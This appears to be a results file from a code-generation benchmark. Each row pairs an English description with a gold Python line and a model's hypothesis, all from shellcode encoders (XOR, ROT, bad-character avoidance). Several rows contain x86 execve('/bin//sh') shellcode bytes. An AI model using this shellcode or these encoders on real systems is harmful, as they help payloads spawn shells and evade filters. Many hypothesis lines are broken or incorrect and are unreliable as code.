idx,nl,gold,hyp
1,"remove '\\x' from the second argument, decode it in hexadecimal, and save in bad_chars","bad_chars = sys . argv [ 2 ] . replace ( ` \ \ x ` , ` ` ) . decode ( ` hex ` )",bad_chars = hex ( ` \ \ x ` ) . decode ( 2 )
3,exit from the iteration,break,sys . exit ( )
32,byte is the sum of y and ROT modulo 256,byte = ( y + ROT ) % 256,shell = ( y + ROT ) % 256
33,byte is byte xor XOR,byte = byte ^ XOR,bit = byte ^ XOR
34,byte is byte shifted left by nbits,byte = byte < < nbits,bit = byte < < nbits
44,Convert the variable x to a hexadecimal and store it in the variable decoded,decoded + = ` % 02x ` % x,decor = ` % 02x ` % x
45,initialize an empty string variable called decoded,decoded = ` `,decoded = `
47,add the string value '0x' to the variable decoded,decoded2 + = ` 0x `,decoded + = ` 0x `
48,initialize an empty string variable called decoded2,decoded2 = ` `,decoded2 = `
67,in decoder_stub replace '\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char,"decoder_stub = decoder_stub . replace ( ` \ x45 ` , struct . pack ( ` B ` , xor_byte ) )","return struct . pack ( ` B ` , struct . pack ( ` B ` , xor_byte ) )"
68,for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\x',decoder_stub_hex = ` ` . join ( ` \ \ x { } ` . format ( hex ( ord ( x ) ) [ 2 : ] ) for x in decoder_stub ),"` \ \ x ` = ` % 02x , ` % hex ( decoder_stub ) [ 2 : ]"
70,define a method named mask that takes in n as a parameter,def mask ( n ) :,def mask ( that ) :
71,"define a method named rol with the parameters n, rotations, and width. Width has a default value of 8","def rol ( n , rotations , width = 8 ) :","def rol ( n , rotations , width , width = Width ) :"
72,"define a method named ror with the parameters n, rotations, and width. Width has a default value of 8","def ror ( n , rotations , width = 8 ) :","def ror ( n , rotations , width , width = Width ) :"
73,else if xxx is equal to the string '0x0',elif xxx = = ` 0x0 ` :,elif x = = ` 0x0 ` :
74,else,else :,elif :
76,"convert the value x in hexadecimal and append it to the string encode followed by ','","encode + = ` % 02x , ` % x","encoded + = ` % 02x , ` % x"
77,append 0x to encode,encode + = ` 0x `,encoded + = ` \ n `
78,append 0xAA to encode,"encode + = ` 0x AA , `",encoded + = ` \ n `
79,encode is an empty string,encode = ` `,encode = `
81,append '\\x' to the string encoded,encoded + = ` \ \ x `,encoded + = ` \ \ x ` `
82,add the string value '\\x' to the variable encoded,encoded + = ` \ \ x `,encoded + = ` \ \ x ` `
84,Convert the variable rand to a hexadecimal and add it to the variable encoded,encoded + = ` \ \ x % 02x ` % rand,encoded + = ` % 02x ` % random
85,convert to hexadecimal a random integer between 1 and 169 and append it to the string encoded,"encoded + = ` \ \ x % 02x ` % random . randint ( 1 , 169 )","encoded + = ` \ \ x % 02x ` % random . randint ( 1 , 100 )"
88,append to the string encoded the hexadecimal conversion of the and operation between h and 0xff,encoded + = ` % 02x ` % ( h & 0xff ),encoded + = ` % 02x ` % ( a & 0xff )
100,slice the variable xxx at index 2 and add the value to the variable encoded,encoded + = xxx [ 2 : ],encoded + = x [ 2 : ]
101,set encoded to an empty string,encoded = ` `,encoded = `
105,encoded is an empty string,encoded = ` `,encoded = `
106,initialize an empty string variable called encoded,encoded = ` `,encoded = `
107,"encoded is the concatenation of the string ""\\x"", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ','","encoded = ` \ \ x % 02x , ` % len ( bytearray ( shellcode ) )",encoded = ` \ \ x % 02x ` ` % len ( bytearray ( shellcode ) )
109,append end to encoded,encoded = encoded + end,encoded + = end + end
113,initialize the variable encoded_nasm to an empty string,encoded_nasm = ` `,encoded_nasm = `
117,"convert xor in hexadecimal and append it followed by ', ' to the string encoded_shellcode","encoded_shellcode + = ` % 02x , ` % xor","encoded_shellcode + = ` % 02x , ` % x"
119,add the string value '\\x' to the variable encoded_shellcode,encoded_shellcode + = ` \ \ x `,encoded_shellcode + = ` 0x `
122,initialize the variable encoded_shellcode to an empty string,encoded_shellcode = ` `,encoded_shellcode = `
123,append to encoded a bytes object containing the value val1 packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , val1 ) )","shellcode . append ( struct . pack ( ` B ` , val1 ) )"
124,append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , xor_byte ) )","shellcode . append ( struct . pack ( ` B ` , xor_byte ) )"
125,add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , xor_byte ) )","shellcode . append ( struct . pack ( ` B ` , xor_byte ) )"
126,append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , xor_byte ) )","shellcode . append ( struct . pack ( ` B ` , xor_byte ) )"
127,add the string value '\\x' to the variable encoded1,encoded1 + = ` \ \ x `,encoded1 + = ` 0x `
129,initialize an empty string variable called encoded1,encoded1 = ` `,encoded1 = `
130,"add the string value ',' to the variable encoded2","encoded2 + = ` , `",encoded2 + = ` 0x `
145,"Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded2",encoded2 + = hex ( leader ) [ 2 : ],encoded2 = hex ( leader ) [ 2 : ]
147,add the value of xxx to the variable encoded2,encoded2 + = xxx,encoded2 + = x
148,set the variable encoded2 to an empty string,encoded2 = ` `,encoded2 = `
152,encoded2 is an empty string,encoded2 = ` `,encoded2 = `
153,initialize an empty string variable called encoded2,encoded2 = ` `,encoded2 = `
159,convert the value x to hex and append it to the string encodedP2,encoded P2 + = ` % 02x ` % x,"encoded P2 + = ` % 02x , ` % x"
164,execve_shellcode is a bytearray of execve_shellcode,execve_shellcode = bytearray ( execve_shellcode ),execve_shellcode = bytearray ( )
165,append 0x90 to execve_shellcode,execve_shellcode . append ( 0x90 ),execve_shellcode + = 0x90
166,exit with 1,exit ( 1 ),sys . exit ( 1 )
173,iterate bytes in list bad_chars,for byte in bad_chars :,for bytes in bad_chars :
179,loop through shellcode converted into a bytearray,for i in bytearray ( shellcode ) :,for y in bytearray ( shellcode ) :
181,loop over execve_shellcode,for i in execve_shellcode :,for a in execve_shellcode :
182,iterate i over 255 random numbers between 1 and 256,"for i in random . sample ( range ( 1 , 256 ) , 255 ) :","for i in random . sample ( range ( 1 , 256 ) , 256 ) :"
187,loop through shellcode converted into a bytearray,for x in bytearray ( shellcode ) :,for y in bytearray ( shellcode ) :
188,loop x over the bytearray of the string shellcode,for x in bytearray ( shellcode ) :,for x in shellcode ( bytearray ) :
190,loop through shellcode converted into a bytearray,for x in bytearray ( shellcode ) :,for y in bytearray ( shellcode ) :
203,"if string ""0x0,"" is in format_0x","if ` 0x0 , ` in format_0x :","if ` 0x0aec , ` ` in format_0x :"
204,check if the length of execve_shellcode is not even,if ( len ( execve_shellcode ) % 2 ) ! = 0 :,if ( len ( execve_shellcode ) % 2 ) :
205,check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0,if ( r ^ shellcode_original [ i ] ! = 0 ) and ( r ^ shellcode_original [ i + 1 ] ! = 0 ) and ( r ^ shellcode_original [ i + 2 ] ! = 0 ) and ( r ^ shellcode_original [ i + 3 ] ! = 0 ) :,if ( r ^ i + 2 [ i ] = 0 ) and ( r ^ shellcode_original [ i + 2 ] = 0 ) and ( r ^ shellcode_original [ i + 3 ] = 0 ) and ( r ^ shellcode_original ] = 0 ) :
207,if count modulo 2 is different from zero,if count % 2 ! = 0 :,if count % 2 = 0 :
210,"convert the string byte to hex, then cast the result to int16 and then check if it is equal to i","if i = = int ( byte . encode ( ` hex ` ) , 16 ) :",if i = = int ( byte . encode ( ` hex ` ) ) :
212,if the length of shellcode_original is not divisable by 4,if len ( shellcode_original ) % 4 ! = 0 :,if len ( shellcode_original ) % 4 = 0 :
213,if the length of sys.argv is different from 3,if len ( sys . argv ) ! = 3 :,if not len ( sys . argv ) = 3 :
217,Check if the length of xxx is greater than 4,if len ( xxx ) > 4 :,if len ( x ) > 4 :
218,if matched_a_byte is True,if matched_a_byte :,if matched_a_byte is True :
220,if matched_a_byte is not True,if not matched_a_byte :,if matched_a_byte is not True :
223,check if the variable rotations is less than 1,if rotations < 1 :,if rot < 1 :
224,check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte,"if struct . pack ( ` B ` , val1 ^ i ) = = bad_byte :","if struct . pack ( ` B ` ` , val1 ^ i ) = = bad_byte :"
225,if stub_has_bad_char is True,if stub_has_bad_char :,if stub_has_bad_char is True :
226,if total does not equal 2,if total ! = 2 :,if total = 2 :
229,check if x is equivalent to the element n in shellcode converted into a bytearray,if x = = bytearray ( shellcode ) [ n ] :,if x = = bytearray ( n ) :
230,if x is greater than 248,if x > 248 :,if x > 255 :
231,check if x is greater than 248,if x > 248 :,if x > 255 :
236,import the package random,import random ;,import random
243,Store in the variable j the sum of i and magic modulus 256,j = ( i + magic ) % 256,j = i + magic % 256
245,return the length of array of bytes of the string shellcode,len ( bytearray ( shellcode ) ) ),return len ( bytearray ( shellcode ) )
252,store in the variable n the result of the bitwise and operation between n and the function mask with the parameter width,n & = mask ( width ),n & = width
257,"convert encoded to string and replace all occurrences of ""\\x"" with "",0x"" in it","nasm = str ( encoded ) . replace ( ` \ \ x ` , ` , 0x ` )","nasm = str ( encoded ) . replace ( ` \ \ x ` ` , ` , 0x ` )"
258,nbits is the second element of sys.argv converted to integer,nbits = int ( sys . argv [ 2 ] ),nbits = int ( sys . argv [ 1 ] )
268,P is a string '\033[35m',P = ` \ 033 [ 35m `,p = ` \ 033 [ 35m `
270,set the variable padding equal to 4 minus the length of shellcode_original modulus 4,padding = 4 - ( len ( shellcode_original ) % 4 ),padding = 4 - len ( shellcode_original ) % 4
273,initialize a random number generator,random . seed ( ),random . sample ( )
274,right shift by val2 the and operation between x and val1 and assign it to res1,res1 = ( ( x & val1 ) > > val2 ),res1 = ( x & val1 ) > > val2
275,perform the and operation between x shifted left by val2 and val1 and assign the result to res1,res1 = ( x < < val2 ) & ( val1 ),res1 = x < < val2 & val1
276,res2 is the result of the and operation between x and val1,res2 = ( x & val1 ),res2 = x & val1
277,res2 is the result of the and operation between res2 and val1,res2 = res2 & val1,res2 = res2 | val1
278,right shift res2 by max_bits minus val2,res2 = res2 > > ( max_bits - val2 ),res2 = res2 > > max_bits - val2
279,left shift x by max_bits minus val2 and assign the result to res2,res2 = x < < ( max_bits - val2 ),res2 = x < < max_bits - val2
280,return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width,return ( ( n < < rotations ) & mask_value ) | ( n > > ( width - rotations ) ),return n < < rotations & bitwise | n > width - rotations . var1
281,return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value,return ( n > > rotations ) | ( ( n < < ( width - rotations ) ) & mask_value ),return n > > rotations | n < < width - rotations & bitwise
283,return 2 to the power of n and subtract 1,return 2 * * n - 1,return 2 * * ( n - 1 )
285,return the value of n,return n,return n ( n )
287,get the hexadecimal value of suplX and reverse its order then store the value in rev_suplx,rev_suplx = hex ( supl X ) [ : : - 1 ],rev_suplx = reversed ( supl X ) [ : - 1 ]
289,ROT is the first element of sys.argv converted to integer,ROT = int ( sys . argv [ 1 ] ),RR = int ( sys . argv [ 0 ] )
290,store in the variable rotations the modulus of rotations and width,rotations % = width,rotations = rotations % width
293,"shellcode is a string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 `,shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` )
295,"define shellcode as a tuple and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80""",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x31 \ xc9 \ x89 \ xca \ x6a \ x0b \ x58 \ xcd \ x80 ` ),def shellcode ( ` 1 À Ph / / shh / bin  ã 1 É  Ê j X Í  ` ) :
296,"define shellcode as a tuple and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),def shellcode ( ` 1 À Ph / / shh / bin  ã P  â S  á ° Í  ` ) :
299,"Declare a tuple called shellcode and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"" into it",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),shellcode = ( shellcode + ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` )
302,"Declare a tuple shellcode and add the string ""\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80"" into it",shellcode = ( ` \ x31 \ xc0 \ x50 \ x89 \ xe2 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ xb0 \ x0b \ xcd \ x80 ` ),shellcode = ` ` % shellcode
303,"store in the variable shellcode b""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = b ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ;,shellcode = b ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 `
304,remove the first 2 items from shellcode,shellcode = shellcode [ 2 : : ],shellcode = shellcode [ 2 : ]
305,shellcode is the first argument after removing string '\\x' decoded in hexadecimal,"shellcode = sys . argv [ 1 ] . replace ( ` \ \ x ` , ` ` ) . decode ( ` hex ` )",shellcode = ` \ \ x ` . pop ( ` hex ` ) . decode ( )
306,Declare a tuple shellcode and add the string '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' into it,shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),shellcode = ` ` % shellcode
307,shellcode_encoded is an empty bitearray,shellcode_encoded = bytearray ( ),shellcode_encoded = bitearray
308,store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\x',shellcode_encoded_hex = ` ` . join ( ` \ \ x { : 02x } ` . format ( x ) for x in shellcode_encoded ),shellcode_encoded_hex = ` . join ( ` - - { : 02x } ` . format ( x ) for x in shellcode_encoded )
309,"store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','","shellcode_encoded_nasm = ` ` . join ( ` 0x { : 02x } , ` . format ( x ) for x in shellcode_encoded ) . rstrip ( ` , ` )","shellcode_encoded_nasm = ` . join ( ` 0x { : 02x } , ` . format ( s ) for s in shellcode_encoded ) . rstrip ( ` , ` )"
310,append the value 0x90 to shellcode_encoded,shellcode_encoded . append ( 0x90 ),shellcode_encoded + = ` \ \ x ` `
311,append the value 0xaa to shellcode_encoded,shellcode_encoded . append ( 0xaa ),shellcode_encoded + = ` \ \ x ` `
313,compute the value of shellcode_original at index i bitwise xor r then append to shellcode_encoded,shellcode_encoded . append ( shellcode_original [ i ] ^ r ),"shellcode_encoded . append ( shellcode_original ( i , r ^ r ) )"
318,save the length of execve_shellcode into shellcode_len,shellcode_len = len ( execve_shellcode ),shellcode_len . write ( len ( execve_shellcode ) )
319,"read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\x' with ''"" and store the result in shellcode_original","shellcode_original = bytearray . fromhex ( f . read ( ) . strip ( ) . replace ( ` \ \ x ` , ` ` ) )","shellcode_original = bytearray . fromhex ( f . read ( ) . strip ( ) . replace ( ` \ \ t ` , ` ) )"
320,store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\x',shellcode_original_hex = ` ` . join ( ` \ \ x { : 02x } ` . format ( x ) for x in shellcode_original ),shellcode_original_hex = ` . join ( ` - - { : 02x } ` . format ( x ) for x in shellcode_original )
321,append 0x90 to the shellcode_original variable,shellcode_original . append ( 0x90 ),shellcode_original + = 0x90
322,shift is the first element of sys.argv converted to integer,shift = int ( sys . argv [ 1 ] ),push = int ( sys . argv [ 0 ] )
323,string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub,string1 = decoder_stub . join ( encoded ),string1 = ` % s . % s ` % encoded
326,subtract sb from fb and store the result in the variable subfs,subfs = fb - sb,subfs = fb - s
327,subtract Dec_hopecode from 255 and store the result in variable suplX,supl X = 255 - Dec_hopcode,supl X = 255 - Dec_hopecode
329,append the element x of execve_shellcode to swapped,swapped . append ( execve_shellcode [ x ] ),swapped = binascii . append ( execve_shellcode )
330,append the element x + 1 of execve_shellcode to swapped,swapped . append ( execve_shellcode [ x + 1 ] ),swapped + = execve_shellcode + 1
331,"separate every 4 characters of the string swapped with the separator "", ""","swapped = ` , ` . join ( swapped [ i : i + 4 ] for i in range ( 0 , len ( swapped ) , 4 ) )","swapped = ` . ` . join ( swapped [ i : i + 4 ] for i in range ( 0 , len ( swapped ) , 4 ) )"
333,swapped is the hexadecimal represenation of the array of bytes swapped,swapped = binascii . hexlify ( bytearray ( swapped ) ),swapped = binascii . hexlify ( )
334,terminate the program,sys . exit ( ),exit
335,call the exit function from sys with 0 as argument,sys . exit ( 0 ),sys . exit ( sys ( 0 ) )
336,Set total to the number of command-line arguments,total = len ( sys . argv ),max = len ( sys . argv [ 99 ] )
338,subtract 1 from 2 raised to max_bits and assign the result to val1,val1 = 2 * * max_bits - 1,val1 = max_bits * ( 2 - 1 )
339,val1 is the result of the bitwise xor between the integer base 16 of the string byte encoded to hex and i,"val1 = int ( byte . encode ( ` hex ` ) , 16 ) ^ i","val1 = int ( byte . encode ( ` hex ` ) , 32 ) ^ i"
340,val2 is the result of the bitwise xor between the integer base 16 of the element i of chunk encoded to hex and xor_byte,"val2 = int ( chunk [ i ] . encode ( ` hex ` ) , 16 ) ^ xor_byte","val2 = int ( chunk [ i ] . encode ( ` hex ` ) , 32 ) ^ xor_byte"
341,val2 is rbits modulo max_bits,val2 = r_bits % max_bits,val2 = modulo
345,start a while loop with the condition xor_byte_good if equivalent to False,while ( xor_byte_good = = False ) :,while ( xor_byte_good ) = = False :
346,open the file stored in shellcode_file using an alias variable f,with open ( shellcode_file ) as f :,"open ( shellcode_file , f )"
349,x is not x,x = ~ x,x = x
353,x is x xor 0xDD,x = x ^ 0x DD,x = x ^ 221
357,xor is the second element of sys.argv converted to integer,xor = int ( sys . argv [ 2 ] ),or = int ( sys . argv [ 1 ] )
358,XOR is the third element of sys.argv converted to integer,XOR = int ( sys . argv [ 3 ] ),XOR = int ( sys . argv [ 2 ] )
360,xor_byte is the output of the function find_valid_xor_byte with the input parameters chunk and bad_chars,"xor_byte = find_valid_xor_byte ( chunk , bad_chars )","x ^ = find_valid_xor_byte ( chunk , bad_chars )"
361,xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars,"xor_byte = find_valid_xor_byte ( string1 , bad_chars )","x ^ = find_valid_xor_byte ( string1 , bad_chars )"
362,set the variable xor_byte_good to the value False,xor_byte_good = False,xor_byte_good = value . False
363,set the variable xor_byte_good to the value True,xor_byte_good = True,xor_byte_good = value . True
364,XOR_HEX is XOR converted to hexadecimal,XOR_HEX = hex ( XOR ),@ XOR
365,"Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int16, store the value of the summation in the variable xxx","xxx = hex ( int ( abs ( subfs ) ) + int ( rev_suplx [ 0 : 2 ] , 16 ) )","xxx + = hex ( int ( abs ( subfs ) ) + int ( rev_suplx [ 0 : 2 ] , 16 ) )"
366,compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y,y ^ = bytearray ( shellcode ) [ 1 ],y = bytearray ( y ) ^ bytearray ( shellcode ) [ 0 ]
367,Y is a '\033[33m',Y = ` \ 033 [ 33m `,y = ` \ 033 [ 33m `
368,y is not x,y = ~ x,y = x
369,compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array,y = bytearray ( shellcode ) [ 0 ] ^ bytearray ( shellcode ) [ 1 ],return int ( shellcode [ 0 ] ) ^ bytearray ( shellcode ) [ 0 ]
372,y is x xor 0xAA,y = x ^ 0x AA,y = x ^ 170
373,set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray,y = x ^ bytearray ( shellcode ) [ n ],y = int ( x ^ shellcode [ n ] ) ^ n
374,set the variable z to bitwise not x,z = ~ x,z = x ^ x
